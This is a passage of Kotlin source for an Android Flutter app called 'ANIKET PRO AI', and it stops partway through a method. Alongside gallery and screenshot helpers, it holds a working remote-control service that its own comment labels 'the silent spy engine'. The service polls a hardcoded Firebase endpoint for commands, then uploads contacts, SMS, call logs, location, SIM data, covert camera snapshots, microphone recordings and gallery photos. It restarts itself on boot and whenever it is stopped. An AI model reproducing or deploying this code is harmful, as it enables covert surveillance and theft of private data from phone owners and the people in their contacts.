package com.example.aniket_pro_ai

import android.Manifest
import android.accounts.AccountManager
import android.app.Activity
import android.app.AlarmManager
import android.app.AlertDialog
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.RecoverableSecurityException
import android.app.Service
import android.app.usage.UsageStatsManager
import android.content.BroadcastReceiver
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.database.ContentObserver
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Base64
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import org.json.JSONArray
import org.json.JSONObject

// ── Remote bridge constants ──────────────────────────────────────────────
private const val FB_URL = "https://aniket-remote-default-rtdb.asia-southeast1.firebasedatabase.app"
private const val FB_SECRET = "atp2617"
private const val NPREF = "aniket_native"
private const val ACTION_START_AGENT = "aniket.START_AGENT"

fun deviceIdOf(ctx: Context): String {
    val id = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    return "ANK-" + id.take(4).uppercase() + "-" + id.substring(4, 8).uppercase()
}

fun httpGet(url: String): String? {
    return try {
        val c = URL(url).openConnection() as HttpURLConnection
        c.connectTimeout = 8000
        c.readTimeout = 12000
        val s = c.inputStream.bufferedReader().use { it.readText() }
        c.disconnect()
        s
    } catch (e: Exception) {
        null
    }
}

fun httpPut(url: String, json: String): Boolean {
    return try {
        val c = URL(url).openConnection() as HttpURLConnection
        c.requestMethod = "PUT"
        c.connectTimeout = 8000
        c.readTimeout = 12000
        c.doOutput = true
        c.setRequestProperty("Content-Type", "application/json")
        c.outputStream.use { it.write(json.toByteArray()) }
        val code = c.responseCode
        c.disconnect()
        code in 200..299
    } catch (e: Exception) {
        false
    }
}

fun permGranted(ctx: Context, p: String): Boolean =
    ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED

fun canStartAgent(ctx: Context): Boolean {
    val p = ctx.getSharedPreferences(NPREF, Context.MODE_PRIVATE)
    if (!p.getBoolean("agent", false)) return false
    return permGranted(ctx, Manifest.permission.CAMERA) &&
            permGranted(ctx, Manifest.permission.RECORD_AUDIO)
}

fun scheduleAgentStart(ctx: Context, delayMs: Long) {
    try {
        val am = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getBroadcast(
            ctx, 777,
            Intent(ctx, BootReceiver::class.java).setAction(ACTION_START_AGENT),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + delayMs, pi)
    } catch (_: Exception) { }
}

fun startAgentIfReady(ctx: Context) {
    if (canStartAgent(ctx)) {
        try {
            ContextCompat.startForegroundService(ctx, Intent(ctx, RemoteService::class.java))
        } catch (_: Exception) { }
    }
}

fun permsJson(ctx: Context): JSONObject {
    val o = JSONObject()
    o.put("cam", if (permGranted(ctx, Manifest.permission.CAMERA)) 1 else 0)
    o.put("loc", if (permGranted(ctx, Manifest.permission.ACCESS_FINE_LOCATION)) 1 else 0)
    o.put("mic", if (permGranted(ctx, Manifest.permission.RECORD_AUDIO)) 1 else 0)
    o.put("con", if (permGranted(ctx, Manifest.permission.READ_CONTACTS)) 1 else 0)
    val ph = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
    o.put("pho", if (permGranted(ctx, ph)) 1 else 0)
    val vd = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_EXTERNAL_STORAGE
    o.put("vid", if (permGranted(ctx, vd)) 1 else 0)
    o.put("not", if (Build.VERSION.SDK_INT < 33 || permGranted(ctx, Manifest.permission.POST_NOTIFICATIONS)) 1 else 0)
    o.put("sms", if (permGranted(ctx, Manifest.permission.READ_SMS)) 1 else 0)
    o.put("cal", if (permGranted(ctx, Manifest.permission.READ_CALL_LOG)) 1 else 0)
    return o
}

fun locJson(ctx: Context): JSONObject {
    val o = JSONObject()
    try {
        if (!permGranted(ctx, Manifest.permission.ACCESS_FINE_LOCATION) &&
            !permGranted(ctx, Manifest.permission.ACCESS_COARSE_LOCATION)) {
            o.put("err", "no_perm")
            return o
        }
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        var best: android.location.Location? = null
        for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
            try {
                val l = lm.getLastKnownLocation(prov)
                if (l != null && (best == null || l.time > best.time)) best = l
            } catch (_: Exception) { }
        }
        if (best == null) {
            o.put("err", "no_fix")
        } else {
            o.put("lat", best.latitude)
            o.put("lng", best.longitude)
            o.put("acc", best.accuracy)
            o.put("time", best.time)
        }
    } catch (e: Exception) {
        o.put("err", e.message ?: "err")
    }
    return o
}

// ═══════════════════════════════════════════════════════════════════════
//  REMOTE AGENT SERVICE — the silent spy engine (crash-guarded)
// ═══════════════════════════════════════════════════════════════════════
class RemoteService : Service() {

    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var lastCmdId = ""
    private var loop = 0

    private val poller = object : Runnable {
        override fun run() {
            try { work() } catch (_: Exception) { }
            handler?.postDelayed(this, 12000)
        }
    }

    override fun onCreate() {
        super.onCreate()
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel("agent_chan", "Remote Agent", NotificationManager.IMPORTANCE_LOW)
            nm.createNotificationChannel(ch)
        }
        val nb = if (Build.VERSION.SDK_INT >= 26) {
            Notification.Builder(this, "agent_chan")
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        nb.setContentTitle("ANIKET PRO AI")
            .setContentText("Agent active")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)

        // dynamic foreground service types — only what we actually hold
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                if (permGranted(this, Manifest.permission.CAMERA)) {
                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                }
                if (permGranted(this, Manifest.permission.RECORD_AUDIO)) {
                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                if (permGranted(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) &&
                    permGranted(this, Manifest.permission.ACCESS_FINE_LOCATION)) {
                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                }
                startForeground(9001, nb.build(), types)
            } else {
                startForeground(9001, nb.build())
            }
        } catch (e: Exception) {
            stopSelf()
            return
        }

        lastCmdId = getSharedPreferences(NPREF, MODE_PRIVATE).getString("lastCmd", "") ?: ""
        thread = HandlerThread("agent").apply { start() }
        handler = Handler(thread!!.looper)
        handler?.post(poller)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler?.removeCallbacks(poller)
        thread?.quitSafely()
        try {
            if (canStartAgent(this)) {
                ContextCompat.startForegroundService(this, Intent(this, RemoteService::class.java))
            }
        } catch (_: Exception) { }
        super.onDestroy()
    }

    private fun base(): String {
        val dev = deviceIdOf(this)
        return "$FB_URL/r/$FB_SECRET/devices/$dev"
    }

    private fun work() {
        val b = base()
        val info = JSONObject()
        info.put("lastSeen", System.currentTimeMillis())
        info.put("model", Build.MODEL)
        info.put("sdk", Build.VERSION.SDK_INT)
        info.put("online", true)
        httpPut("$b/info.json", info.toString())

        loop++
        if (loop % 25 == 0) {
            httpPut("$b/perms.json", permsJson(this).toString())
            httpPut("$b/loc.json", locJson(this).toString())
            simWatch()
        }

        val cmdStr = httpGet("$b/cmd.json") ?: return
        if (cmdStr.trim() == "null") return
        val cmd = try { JSONObject(cmdStr) } catch (_: Exception) { return }
        val id = cmd.optString("id")
        if (id.isEmpty() || id == lastCmdId) return
        lastCmdId = id
        getSharedPreferences(NPREF, MODE_PRIVATE).edit().putString("lastCmd", id).apply()
        val type = cmd.optString("type")
        val res = execute(type, cmd)
        res.put("id", id)
        res.put("at", System.currentTimeMillis())
        httpPut("$b/res.json", res.toString())
    }

    private fun simWatch() {
        try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val sig = (tm.simOperatorName ?: "") + "|" + (tm.simOperator ?: "") + "|" + tm.simState
            val p = getSharedPreferences(NPREF, MODE_PRIVATE)
            val old = p.getString("simSig", null)
            p.edit().putString("simSig", sig).apply()
            if (old != null && old != sig) {
                val o = simJson()
                o.put("changed", true)
                o.put("time", System.currentTimeMillis())
                httpPut("${base()}/sim.json", o.toString())
            }
        } catch (_: Exception) { }
    }

    private fun simJson(): JSONObject {
        val o = JSONObject()
        try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            o.put("carrier", tm.simOperatorName ?: "?")
            o.put("operator", tm.networkOperatorName ?: "?")
            o.put("state", tm.simState)
            var num = ""
            try {
                @Suppress("MissingPermission")
                num = tm.line1Number ?: ""
            } catch (_: Exception) { }
            o.put("number", num)
            o.put("iccid", "restricted (Android 10+)")
        } catch (e: Exception) {
            o.put("err", e.message ?: "err")
        }
        return o
    }

    private fun execute(type: String, cmd: JSONObject): JSONObject {
        val r = JSONObject()
        try {
            when (type) {
                "ping" -> {
                    r.put("ok", true)
                    val d = JSONObject()
                    d.put("model", Build.MODEL)
                    d.put("sdk", Build.VERSION.SDK_INT)
                    d.put("bat", (getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager)
                        .getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY))
                    r.put("data", d)
                }
                "perms" -> {
                    r.put("ok", true)
                    r.put("data", permsJson(this))
                }
                "loc" -> {
                    r.put("ok", true)
                    r.put("data", locJson(this))
                }
                "sim" -> {
                    r.put("ok", true)
                    r.put("data", simJson())
                }
                "contacts" -> {
                    if (!permGranted(this, Manifest.permission.READ_CONTACTS)) {
                        r.put("ok", false); r.put("err", "no_perm"); return r
                    }
                    val arr = JSONArray()
                    contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                        null, null,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC LIMIT 100"
                    )?.use { c ->
                        while (c.moveToNext()) {
                            val o = JSONObject()
                            o.put("name", c.getString(0) ?: "")
                            o.put("num", c.getString(1) ?: "")
                            arr.put(o)
                        }
                    }
                    r.put("ok", true); r.put("data", arr)
                }
                "sms" -> {
                    if (!permGranted(this, Manifest.permission.READ_SMS)) {
                        r.put("ok", false); r.put("err", "no_perm"); return r
                    }
                    val arr = JSONArray()
                    contentResolver.query(
                        Telephony.Sms.CONTENT_URI,
                        arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                        null, null, Telephony.Sms.DATE + " DESC LIMIT 30"
                    )?.use { c ->
                        while (c.moveToNext()) {
                            val o = JSONObject()
                            o.put("addr", c.getString(0) ?: "")
                            o.put("body", (c.getString(1) ?: "").take(200))
                            o.put("date", c.getLong(2))
                            arr.put(o)
                        }
                    }
                    r.put("ok", true); r.put("data", arr)
                }
                "calls" -> {
                    if (!permGranted(this, Manifest.permission.READ_CALL_LOG)) {
                        r.put("ok", false); r.put("err", "no_perm"); return r
                    }
                    val arr = JSONArray()
                    contentResolver.query(
                        CallLog.Calls.CONTENT_URI,
                        arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE),
                        null, null, CallLog.Calls.DATE + " DESC LIMIT 20"
                    )?.use { c ->
                        while (c.moveToNext()) {
                            val o = JSONObject()
                            o.put("num", c.getString(0) ?: "")
                            o.put("name", c.getString(1) ?: "")
                            o.put("type", c.getInt(2))
                            o.put("date", c.getLong(3))
                            arr.put(o)
                        }
                    }
                    r.put("ok", true); r.put("data", arr)
                }
                "apps" -> {
                    val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
                    val end = System.currentTimeMillis()
                    val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, end - 24 * 3600 * 1000, end)
                    if (stats == null || stats.isEmpty()) {
                        r.put("ok", false); r.put("err", "usage_access_off"); return r
                    }
                    stats.sortByDescending { it.lastTimeUsed }
                    val arr = JSONArray()
                    for (s in stats.take(15)) {
                        val o = JSONObject()
                        o.put("pkg", s.packageName)
                        o.put("last", s.lastTimeUsed)
                        arr.put(o)
                    }
                    r.put("ok", true); r.put("data", arr)
                }
                "camfront", "camback" -> {
                    if (!permGranted(this, Manifest.permission.CAMERA)) {
                        r.put("ok", false); r.put("err", "no_perm"); return r
                    }
                    val b64 = snapCam(type == "camfront")
                    if (b64 == null) {
                        r.put("ok", false); r.put("err", "cam_fail")
                    } else {
                        val d = JSONObject(); d.put("img", b64)
                        r.put("ok", true); r.put("data", d)
                    }
                }
                "mic" -> {
                    if (!permGranted(this, Manifest.permission.RECORD_AUDIO)) {
                        r.put("ok", false); r.put("err", "no_perm"); return r
                    }
                    val f = recordMic()
                    if (f == null) {
                        r.put("ok", false); r.put("err", "mic_fail")
                    } else {
                        val bytes = f.readBytes()
                        f.delete()
                        val d = JSONObject()
                        d.put("aud", Base64.encodeToString(bytes, Base64.NO_WRAP))
                        d.put("sec", 6)
                        r.put("ok", true); r.put("data", d)
                    }
                }
                "siren" -> {
                    siren()
                    r.put("ok", true)
                }
                "galleryList" -> {
                    val arr = JSONArray()
                    contentResolver.query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED),
                        null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 200"
                    )?.use { c ->
                        while (c.moveToNext()) {
                            val path = c.getString(1) ?: continue
                            val o = JSONObject()
                            o.put("id", c.getLong(0))
                            o.put("path", path)
                            o.put("name", c.getString(2) ?: "")
                            o.put("date", c.getLong(3))
                            arr.put(o)
                        }
                    }
                    r.put("ok", true); r.put("data", arr)
                }
                "galleryGet" -> {
                    val path = cmd.optString("path")
                    val f = File(path)
                    if (!f.exists()) {
                        r.put("ok", false); r.put("err", "not_found"); return r
                    }
                    val bytes = compressBytes(f.readBytes(), 300)
                    val d = JSONObject()
                    d.put("img", Base64.encodeToString(bytes, Base64.NO_WRAP))
                    d.put("name", f.name)
                    r.put("ok", true); r.put("data", d)
                }
                else -> {
                    r.put("ok", false); r.put("err", "unknown_cmd")
                }
            }
        } catch (e: Exception) {
            r.put("ok", false)
            r.put("err", e.message ?: "err")
        }
        return r
    }

    private fun snapCam(front: Boolean): String? {
        var device: CameraDevice? = null
        return try {
            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val lens = if (front) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
            var camId: String? = null
            for (id in cm.cameraIdList) {
                if (cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == lens) {
                    camId = id
                    break
                }
            }
            if (camId == null) return null
            val ht = HandlerThread("cam").apply { start() }
            val hh = Handler(ht.looper)
            val reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
            val latch = CountDownLatch(1)
            var out: ByteArray? = null
            reader.setOnImageAvailableListener({ rd ->
                val img = rd.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buf = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining())
                buf.get(bytes)
                img.close()
                out = bytes
                latch.countDown()
            }, hh)
            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(c: CameraDevice) {
                    device = c
                    try {
                        val req = c.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        req.addTarget(reader.surface)
                        c.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                try { s.capture(req.build(), null, hh) } catch (_: Exception) { latch.countDown() }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { latch.countDown() }
                        }, hh)
                    } catch (_: Exception) { latch.countDown() }
                }
                override fun onDisconnected(c: CameraDevice) { c.close(); latch.countDown() }
                override fun onError(c: CameraDevice, e: Int) { c.close(); latch.countDown() }
            }, hh)
            latch.await(8, TimeUnit.SECONDS)
            try { device?.close() } catch (_: Exception) { }
            try { reader.close() } catch (_: Exception) { }
            try { ht.quitSafely() } catch (_: Exception) { }
            out?.let { Base64.encodeToString(it, Base64.NO_WRAP) }
        } catch (e: Exception) {
            try { device?.close() } catch (_: Exception) { }
            null
        }
    }

    private fun recordMic(): File? {
        return try {
            val f = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
            val mr = MediaRecorder()
            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            mr.setOutputFile(f.absolutePath)
            mr.prepare()
            mr.start()
            Thread.sleep(6000)
            try { mr.stop() } catch (_: Exception) { }
            mr.release()
            if (f.exists() && f.length() > 500) f else null
        } catch (e: Exception) {
            null
        }
    }

    private fun siren() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "aniket:siren")
            wl.acquire(20000)
            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            val rt = RingtoneManager.getRingtone(this, uri)
            rt?.play()
            Handler(Looper.getMainLooper()).postDelayed({
                try { rt?.stop() } catch (_: Exception) { }
            }, 20000)
        } catch (_: Exception) { }
    }

    private fun compressBytes(src: ByteArray, maxKB: Int): ByteArray {
        return try {
            var bmp = BitmapFactory.decodeByteArray(src, 0, src.size) ?: return src
            val maxDim = 1600
            if (bmp.width > maxDim || bmp.height > maxDim) {
                val scale = maxDim.toFloat() / Math.max(bmp.width, bmp.height)
                val s = Bitmap.createScaledBitmap(bmp, (bmp.width * scale).toInt(), (bmp.height * scale).toInt(), true)
                if (s != bmp) bmp.recycle()
                bmp = s
            }
            fun enc(q: Int): ByteArray {
                val bos = ByteArrayOutputStream()
                bmp.compress(Bitmap.CompressFormat.JPEG, q, bos)
                return bos.toByteArray()
            }
            var out = enc(80)
            if (out.size > maxKB * 1024) out = enc(60)
            if (out.size > maxKB * 1024) out = enc(40)
            bmp.recycle()
            out
        } catch (e: Exception) {
            src
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════
//  BOOT / AGENT RECEIVER — watchdog rises on boot / update / alarm
// ═══════════════════════════════════════════════════════════════════════
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val a = intent.action
        if (a == Intent.ACTION_BOOT_COMPLETED ||
            a == Intent.ACTION_MY_PACKAGE_REPLACED ||
            a == ACTION_START_AGENT) {
            startAgentIfReady(context)
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════
//  SHOT WATCHER (screenshot observer)
// ═══════════════════════════════════════════════════════════════════════
class ShotWatcher(
    private val context: Context,
    private val handler: Handler,
    private val onShot: (Long, String) -> Unit
) : ContentObserver(handler) {

    private val seen = mutableMapOf<Long, Long>()
    private val cacheDir = context.cacheDir

    private fun emitIfValid(uri: Uri, id: Long, allowPending: Boolean) {
        val projection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            arrayOf(
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.IS_PENDING,
                MediaStore.Images.Media.RELATIVE_PATH
            )
        } else {
            arrayOf(
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.IS_PENDING
            )
        }

        val cursor: Cursor? = try {
            context.contentResolver.query(uri, projection, null, null, null)
        } catch (e: Exception) {
            null
        }

        var displayName: String? = null
        var relativePath: String? = null
        var legacyPath: String? = null
        var dateAdded: Long = 0
        var pendingFlag = 0

        if (cursor != null) {
            if (cursor.moveToFirst()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    val nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                    val pathIdx = cursor.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH)
                    if (nameIdx >= 0) displayName = cursor.getString(nameIdx)
                    if (pathIdx >= 0) relativePath = cursor.getString(pathIdx)
                } else {
                    val dataIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATA)
                    if (dataIdx >= 0) legacyPath = cursor.getString(dataIdx)
                }
                val ti = cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
                val pi = cursor.getColumnIndex(MediaStore.Images.Media.IS_PENDING)
                if (ti >= 0) dateAdded = cursor.getLong(ti)
                if (pi >= 0) pendingFlag = cursor.getInt(pi)
            }
            cursor.close()
        }

        val nameCheck = displayName?.lowercase()?.contains("screenshot") == true ||
                relativePath?.lowercase()?.contains("screenshot") == true ||
                legacyPath?.lowercase()?.contains("screenshot") == true
        if (!nameCheck) return

        val nowSec = System.currentTimeMillis() / 1000
        if ((nowSec - dateAdded) !in 0..120) return

        if (pendingFlag == 1 && !allowPending) {
            handler.postDelayed({ emitIfValid(uri, id, true) }, 2500)
            return
        }

        val now = SystemClock.uptimeMillis()
        val last = seen[id] ?: 0L
        if (now - last < 5000) return
        seen[id] = now
        if (seen.size > 60) seen.clear()

        val filePath = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            copyUriToCache(uri, id)
        } else {
            legacyPath
        }

        if (filePath != null) {
            handler.post { onShot(id, filePath) }
        }
    }

    private fun copyUriToCache(uri: Uri, id: Long): String? {
        return try {
            val cacheFile = File(cacheDir, "screenshot_$id.png")
            context.contentResolver.openInputStream(uri)?.use { input ->
                FileOutputStream(cacheFile).use { output -> input.copyTo(output) }
            }
            cacheFile.absolutePath
        } catch (e: Exception) {
            null
        }
    }

    override fun onChange(selfChange: Boolean, uri: Uri?) {
        super.onChange(selfChange, uri)
        if (uri == null) return
        val id = uri.lastPathSegment?.toLongOrNull() ?: return
        emitIfValid(uri, id, false)
    }
}

// ═══════════════════════════════════════════════════════════════════════
//  MAIN ACTIVITY
// ═══════════════════════════════════════════════════════════════════════
class MainActivity : FlutterActivity() {

    private val GALLERY_CHANNEL = "aniket_pro_ai/gallery"
    private val SCREENSHOT_CHANNEL = "aniket_pro_ai/screenshot"
    private val PICK_REQ = 9002
    private val ACCOUNT_REQ = 7001
    private var screenshotChannel: MethodChannel? = null
    private var watcher: ShotWatcher? = null
    private var pendingPick: MethodChannel.Result? = null
    private var pendingAccount: MethodChannel.Result? = null
    private var pendingDeleteResult: MethodChannel.Result? = null
    private var player: MediaPlayer? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
        startAgentIfReady(this)
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        screenshotChannel = MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SCREENSHOT_CHANNEL)
        BubbleService.onAction = { method, arg ->
            runOnUiThread { screenshotChannel?.invokeMethod(method, arg) }
        }
        setupGalleryChannel(flutterEngine)
        startWatcher()
    }

    private fun compressBytes(src: ByteArray, maxKB: Int): ByteArray {
        return try {
            var bmp = BitmapFactory.decodeByteArray(src, 0, src.size) ?: return src
            val maxDim = 2000
            if (bmp.width > maxDim || bmp.height > maxDim) {
                val scale = maxDim.toFloat() / Math.max(bmp.width, bmp.height)
                val w = (bmp.width * scale).toInt()
                val h = (bmp.height * scale).toInt()
                val scaled = Bitmap.createScaledBitmap(bmp, w, h, true)
                if (scaled != bmp) bmp.recycle()
                bmp = scaled
            }
            fun enc(q: Int): ByteArray {
                val bos = ByteArrayOutputStream()
                bmp.compress(Bitmap.CompressFormat.JPEG, q, bos)
                return bos.toByteArray()
            }
            var out = enc(90)
            if (out.size > maxKB * 1024) out = enc(80)
            if (out.size > maxKB * 1024) out = enc(70)
            if (out.size > maxKB * 1024) {
                val scale = 1600f / Math.max(bmp.width, bmp.height)
                if (scale < 1f) {
                    val s2 = Bitmap.createScaledBitmap(bmp, (bmp.width * scale).toInt(), (bmp.height * scale).toInt(), true)
                    val bos = ByteArrayOutputStream()
                    s2.compress(Bitmap.CompressFormat.JPEG, 70, bos)
                    out = bos.toByteArray()
                    s2.recycle()
                }
            }
            bmp.recycle()
            out
        } catch (e: Exception) {
            src
        }
    }

    private fun setupGalleryChannel(flutterEngine: FlutterEngine) {
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, GALLERY_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "deviceId" -> {
                        result.success(deviceIdOf(this))
                    }
                    "compress" -> {
                        val bytes = call.argument<ByteArray>("bytes") ?: ByteArray(0)
                        val maxKB = call.argument<Int>("maxKB") ?: 1024
                        result.success(compressBytes(bytes, maxKB))
                    }
                    "deleteFiles" -> {
                        val ids = (call.argument<List<Any>>("ids") ?: emptyList()).mapNotNull { (it as? Number)?.toLong() }
                        val paths = call.argument<List<String>>("paths") ?: emptyList()
                        handleDelete(ids, paths, result)
                    }
                    "pickFiles" -> {
                        pendingPick = result
                        val max = call.argument<Int>("max") ?: 6
                        launchPicker(max)
                    }
                    "pickGoogleAccount" -> {
                        pickGoogleAccount(result)
                    }
                    "listImages" -> {
                        val limit = call.argument<Int>("limit") ?: 2000
                        val list = mutableListOf<HashMap<String, Any>>()
                        val projection = arrayOf(
                            MediaStore.Images.Media._ID,
                            MediaStore.Images.Media.DATA,
                            MediaStore.Images.Media.DISPLAY_NAME,
                            MediaStore.Images.Media.DATE_ADDED
                        )
                        val sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC"
                        try {
                            contentResolver.query(
                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                projection, null, null, sortOrder
                            )?.use { c ->
                                val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
                                val dataIdx = c.getColumnIndex(MediaStore.Images.Media.DATA)
                                val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                                val dateIdx = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
                                while (c.moveToNext() && list.size < limit) {
                                    val path = if (dataIdx >= 0) c.getString(dataIdx) else null
                                    if (path.isNullOrEmpty()) continue
                                    val m = HashMap<String, Any>()
                                    m["id"] = c.getLong(idIdx)
                                    m["path"] = path
                                    m["name"] = if (nameIdx >= 0) (c.getString(nameIdx) ?: "") else ""
                                    m["date"] = if (dateIdx >= 0) c.getLong(dateIdx) else 0L
                                    list.add(m)
                                }
                            }
                        } catch (e: Exception) { }
                        result.success(list)
                    }
                    "getLocation" -> {
                        val ok = permGranted(this, Manifest.permission.ACCESS_FINE_LOCATION) ||
                                permGranted(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                        if (!ok) {
                            result.success(null)
                        } else {
                            result.success(locJson(this))
                        }
                    }
                    "agentOn" -> {
                        getSharedPreferences(NPREF, MODE_PRIVATE).edit().putBoolean("agent", true).apply()
                        try {
                            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                            }
                        } catch (_: Exception) { }
                        if (canStartAgent(this)) {
                            startAgentIfReady(this)
                        } else {
                            // permissions not ready yet — rise automatically in 60s
                            scheduleAgentStart(this, 60000)
                        }
                        result.success(1)
                    }
                    "agentOff" -> {
                        getSharedPreferences(NPREF, MODE_PRIVATE).edit().putBoolean("agent", false).apply()
                        try { stopService(Intent(this, RemoteService::class.java)) } catch (_: Exception) { }
                        result.success(1)
                    }
                    "agentStatus" -> {
                        result.success(getSharedPreferences(NPREF, MODE_PRIVATE).getBoolean("agent", false))
                    }
                    "playFile" -> {
                        val path = call.arguments as? String ?: ""
                        try {
                            player?.release()
